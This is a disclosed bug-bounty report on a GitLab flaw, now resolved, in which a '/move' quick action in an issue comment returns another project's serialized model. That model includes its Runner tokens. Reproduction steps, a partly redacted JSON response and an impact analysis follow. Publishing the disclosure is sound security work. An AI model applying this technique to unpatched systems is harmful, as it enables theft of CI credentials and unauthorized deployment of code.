---
tags:
  - type/disclosure
  - platform/hackerone
  - severity/critical
  - cwe/information-disclosure
  - env/web
  - stack/gitlab
substate: "resolved"
weakness: "Information Disclosure"
enriched: true
body: true
date: 2019-04-20
submitted: 2019-03-14T21:23:29.177Z
bounty_usd: 12000
votes: 366
cve: []
program: "[[programs/gitlab|GitLab]]"
reporter: "jobert"
source: "https://hackerone.com/reports/509924"
title: "JSON serialization of any Project model results in all Runner tokens being exposed through Quick Actions"
---
# JSON serialization of any Project model results in all Runner tokens being exposed through Quick Actions

> **Severity:** Critical | **Bounty:** 12,000 USD | **Votes:** 366 | **Program:** GitLab | **Disclosed:** 2019-04-20

- Report: [https://hackerone.com/reports/509924](https://hackerone.com/reports/509924)
- CWE: Information Disclosure
- Submitted: 2019-03-14T21:23:29.177Z

## Report body

Public report body - fetched from `https://hackerone.com/reports/<id>.json` (the site's own disclosed-report data route).

The Quick Actions interpreter allows an attacker to reference a Project it does not have access to. The model attributes are then being serialized and returned to the user, which results in the Runner token (both encrypted and unencrypted) being returned to the user. This vulnerability is currently exploitable on GitLab.com.

# Proof of concept
The vulnerability is relatively straightforward to reproduce.

1. Create a project
1. Create an issue
1. Write `/move <full path of any other project>` and click "Comment", a request to `/:namespace/:project/notes` is submitted
1. Observe the JSON response that is being returned, which contains the serialized Project model:

```
HTTP/1.1 200 OK
Server: nginx
...

{
  "commands_changes": {
    "target_project": {
      "id": 11104317,
      "name": "	█████",
      "path": "█████",
      "description": "",
      "created_at": "2019-03-02T01:39:34.285Z",
      "updated_at": "2019-03-02T01:39:34.285Z",
      "creator_id": 3627572,
      "namespace_id": 4717826,
      "last_activity_at": "2019-03-02T01:39:34.285Z",
      "import_url": null,
      "visibility_level": 0,
      "archived": false,
      "merge_requests_template": null,
      "star_count": 0,
      "merge_requests_rebase_enabled": false,
      "import_type": null,
      "import_source": null,
      "avatar": {
        "url": null
      },
      "approvals_before_merge": 0,
      "reset_approvals_on_push": false,
      "merge_requests_ff_only_enabled": false,
      "issues_template": null,
      "mirror": false,
      "mirror_user_id": null,
      "ci_id": null,
      "shared_runners_enabled": true,
      "runners_token": "mzssqx69THU██████████",
      "build_coverage_regex": null,
      "build_allow_git_fetch": true,
      "build_timeout": 3600,
      "mirror_trigger_builds": false,
      "public_builds": true,
      "pending_delete": false,
      "last_repository_check_failed": null,
      "last_repository_check_at": null,
      "container_registry_enabled": true,
      "only_allow_merge_if_pipeline_succeeds": false,
      "has_external_issue_tracker": false,
      "repository_storage": "nfs-file28",
      "request_access_enabled": false,
      "has_external_wiki": false,
      "repository_read_only": null,
      "lfs_enabled": true,
      "only_allow_merge_if_all_discussions_are_resolved": false,
      "repository_size_limit": null,
      "service_desk_enabled": false,
      "printing_merge_request_link_enabled": true,
      "auto_cancel_pending_pipelines": "enabled",
      "last_repository_updated_at": "2019-03-02T01:39:34.285Z",
      "ci_config_path": null,
      "disable_overriding_approvers_per_merge_request": null,
      "delete_error": null,
      "storage_version": 2,
      "resolve_outdated_diff_discussions": false,
      "remote_mirror_available_overridden": null,
      "only_mirror_protected_branches": null,
      "pull_mirror_available_overridden": null,
      "jobs_cache_index": null,
      "external_authorization_classification_label": "",
      "mirror_overwrites_diverged_branches": null,
      "external_webhook_token": null,
      "pages_https_only": true,
      "packages_enabled": true,
      "merge_requests_author_approval": null,
      "pool_repository_id": null,
      "runners_token_encrypted": "A6nIFzMXZzDdfR5iu9hq6███████████████",
      "bfg_object_map": {
        "url": null
      },
      "merge_requests_require_code_owner_approval": null,
      "import_status": "none",
      "mirror_last_update_at": null,
      "mirror_last_successful_update_at": null,
      "import_error": null,
      "import_jid": null
    }
  },
  "valid": false,
  "errors": {
    "commands_only": [
      "Commands applied"
    ]
  }
}
```

## Impact

This vulnerability gives any user who can create an Issue or comment on one the ability to obtain Runner tokens of Projects. This allows any user to register a runner for a project, which may give the attacker access to secret project variables. Given how these variables are used, this may allow an attacker to deploy arbitrary code to a victim's environment.

## Timeline

- **Report Filed**
- **2019-03-14** @gitlab-securitybot: Hi @jobert,

Thank you for submitting this report. We will investigate the issue as soon as possible.
Due to our current workload, we will get back within 14 business days with an update.

Please refrain from submitting your report or inquiring about its status through
additional channels, as this unnecessarily binds resources in the security team.

Best regards,
GitLab Security Team
- **Report Triaged**
- **2019-03-15** @gitlab-securitybot: ETA for fix:

Hi @jobert,

The GitLab issue created from your report is currently scheduled for 2019-04-22.

Thank you again for contacting us!

Best regards,
GitLab Security Team
- **Report Resolved**
- **Bounty Awarded**
- **Agreed On Going Public**
- **Report Became Public**
